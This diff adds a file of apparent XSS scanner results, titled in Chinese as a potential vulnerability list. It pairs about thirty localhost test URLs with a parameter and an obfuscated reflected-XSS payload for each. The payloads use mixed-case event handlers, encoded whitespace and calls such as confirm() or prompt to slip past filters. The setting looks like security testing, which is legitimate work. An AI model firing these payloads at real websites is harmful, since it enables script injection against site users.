@@ -1,0 +1,32 @@
+潜在漏洞列表 (URL | 参数 | Payload)
+============================================================
+http://localhost:8080/xss/reflect/textarea2_fp | in | <detAIls%0aonToggle%0a=%0a(confirm)()%0dx>
+http://localhost:8080/xss/reflect/onmouseover_unquoted_fp | in | ><htMl%0aOnmOUseOVer%09=%09(prompt)``%0dx//
+http://localhost:8080/xss/reflect/backslash1 | in | <A%0doNmOUseOVER+=+confirm()%0dx//v3dm0s
+http://localhost:8080/xss/reflect/js4_dq | in | <html%09OnPoinTEReNTEr%0d=%0da=prompt,a()//
+http://localhost:8080/xss/reflect/doubq1 | in | <A%0aOnPOiNtEreNteR%0a=%0aa=prompt,a()>v3dm0s
+http://localhost:8080/xss/reflect/textarea1_fp | in | <a%0aOnpointereNtEr%09=%09confirm()>v3dm0s
+http://localhost:8080/xss/reflect/js3_notags | in | <HTML%09oNmOUSEovER%0a=%0a(prompt)``//
+http://localhost:8080/xss/reflect/oneclick1 | in | \"%0aAutoFOCUS%0aoNFoCUs=confirm()%0a\"
+http://localhost:8080/xss/reflect/js6_sq_fp | in | \"/+/AUtoFOcus/+/ONFoCUS=(confirm)()/+/\"
+http://localhost:8080/xss/reflect/full1 | in | <a%09OnPOinterenter%0a=%0a(confirm)()>v3dm0s
+http://localhost:8080/xss/reflect/textarea2 | in | <A/+/onmOUSEover%0a=%0aconfirm()%0dx>v3dm0s
+http://localhost:8080/xss/reflect/js6_sq | in | <d3V%0aonPOintErENTeR%0a=%0a[8].find(confirm)%0dx>v3dm0s
+http://localhost:8080/xss/reflect/raw1 | in | <d3V/+/OnMoUseOVeR%09=%09(confirm)()//v3dm0s
+http://localhost:8080/xss/reflect/basic_in_tag | in | <DetailS%0dOnpOiNtEReNter%09=%09a=prompt,a()%0dx//
+http://localhost:8080/xss/reflect/js3_notags_fp | in | <d3V/+/oNpoINTERENtER%0d=%0dconfirm()%0dx>v3dm0s
+http://localhost:8080/xss/reflect/onmouseover_div_unquoted_fp | in | ><HTMl%0aonmoUsEOVER%0a=%0aa=prompt,a()%0dx//
+http://localhost:8080/xss/reflect/onmouseover | in | "><deTAiLS%0dONpoInTerenter%0a=%0a(prompt)``//
+http://localhost:8080/xss/reflect/onmouseover_div_unquoted | in | ><d3V%09OnpOINTeRenTeR+=+confirm()%0dx>v3dm0s
+http://localhost:8080/xss/reflect/js3_fp | in | <dETails%09onpoiNtErentEr%0d=%0d(confirm)()>
+http://localhost:8080/xss/reflect/textarea1 | in | <htmL/+/OnMouSeovER+=+a=prompt,a()//
+http://localhost:8080/xss/reflect/rs1 | in | <DetAILs%09OnToGGle%0d=%0d[8].find(confirm)//
+http://localhost:8080/xss/reflect/js3 | in | <deTaILs%0aONpOINTErEnTer%0d=%0da=prompt,a()%0dx>
+http://localhost:8080/xss/reflect/js4_dq_fp | in | <a%0aOnPoINtEReNteR%0a=%0a[8].find(confirm)>v3dm0s
+http://localhost:8080/xss/reflect/onmouseover_unquoted | in | ><D3v%09OnPOIntEREnteR%0d=%0d[8].find(confirm)>v3dm0s
+http://localhost:8080/xss/reflect/raw1_fp | in | };(prompt)``//\
+http://localhost:8080/xss/reflect/js3_search_fp | in | </tITle><d3V%09onPoinTeREnTer+=+confirm()%0dx>v3dm0s
+http://localhost:8080/xss/reflect/enc2 | in | \";(confirm)()//
+http://localhost:8080/xss/reflect/enc2_fp | in | \";(confirm)()//
+http://localhost:8080/xss/reflect/js6_sq_combo1 | in | \"%0aautoFoCuS%0aoNfOCus=a=prompt,a()%0a\"
+http://localhost:8080/xss/reflect/js_script_close | in | <A/+/onmoUseoVER%0a=%0aconfirm()%0dx>v3dm0s
